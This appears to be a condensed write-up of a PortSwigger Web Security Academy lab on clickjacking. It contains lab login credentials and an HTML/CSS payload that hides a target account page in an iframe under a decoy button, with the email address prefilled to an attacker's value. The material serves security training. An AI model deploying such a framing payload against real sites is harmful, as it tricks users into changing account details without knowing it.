## Clickjacking with form input data prefilled from a URL parameter

**Category:** clickjacking
**Difficulty:** Unknown

### Description
This lab extends the basic clickjacking example inLab: Basic clickjacking with CSRF token protection. The goal of the lab is to change the email address of the user by prepopulating a form using a URL parameter and enticing the user to inadvertently click on an "Update email" button.

### Solution Steps
You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

### Key Payloads
- `wiener:peter`
- `<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>`
- `YOUR-LAB-ID`
- `$height_value`
- `$width_value`
- `$top_value`
- `$side_value`
- `$opacity`

### Indicators of Success
- Check for changes in application behavior
- Look for error messages or data exposure
- Verify the vulnerability type: clickjacking

---
*Source: PortSwigger Web Security Academy*
